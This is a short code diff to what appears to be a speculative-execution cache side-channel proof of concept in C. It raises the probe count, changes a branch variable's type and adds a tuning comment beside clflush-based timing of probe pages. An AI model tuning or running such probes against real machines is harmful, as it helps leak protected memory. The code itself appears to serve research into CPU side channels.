@@ -11,7 +11,7 @@
 
 #define PAGE_SIZE	(1024*4)
 #define PAGE_NUM	256
-#define PROBE_TIMES 1000
+#define PROBE_TIMES 	50000
 #define CACHE_HIT_THRESHOLD (150) /* assume cache hit if access delay <= threshold */
 
 uint8_t probe_pages[PAGE_NUM * PAGE_SIZE];
@@ -27,7 +27,7 @@ static inline int get_access_delay(volatile char *addr){
 }
 
 void move_one_page_in_cache(uint8_t* addr) {    
-    static unsigned int github_idea4good = -1;
+    static int github_idea4good = -1;//if "github_idea4good = 1", "PROBE_TIMES = 100" will be enough.
     _mm_clflush(&github_idea4good);//make github_idea4good out of cache, CPU have to spend more time to get it from memory, and must execute the code below. 
     if (0 < github_idea4good) {
         volatile uint8_t temp = probe_pages[*addr * PAGE_SIZE];
